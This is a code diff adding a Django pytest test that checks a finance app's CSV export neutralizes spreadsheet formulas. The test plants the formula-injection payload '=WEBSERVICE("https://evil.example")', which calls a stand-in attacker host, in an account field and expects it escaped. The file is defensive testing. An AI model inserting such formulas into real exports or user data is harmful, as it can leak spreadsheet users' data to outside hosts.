@@ -232,3 +232,14 @@ def test_csv_export_synthesis_investment_with_holdings(
     assert row is not None
     expected_value = active_investment_account.get_value()
     assert str(expected_value.amount) in row[3]
+
+
+@pytest.mark.django_db
+def test_csv_export_synthesis_neutralizes_formulas(
+    user_client, saving_account_type, active_saving_account
+):
+    active_saving_account.institution = '=WEBSERVICE("https://evil.example")'
+    active_saving_account.save()
+    response = user_client.get(reverse("finance:csv_export_synthesis"))
+    row = _find_row_by_owner(_parse_csv(response), "Tess")
+    assert row[2] == '\'=WEBSERVICE("https://evil.example")'
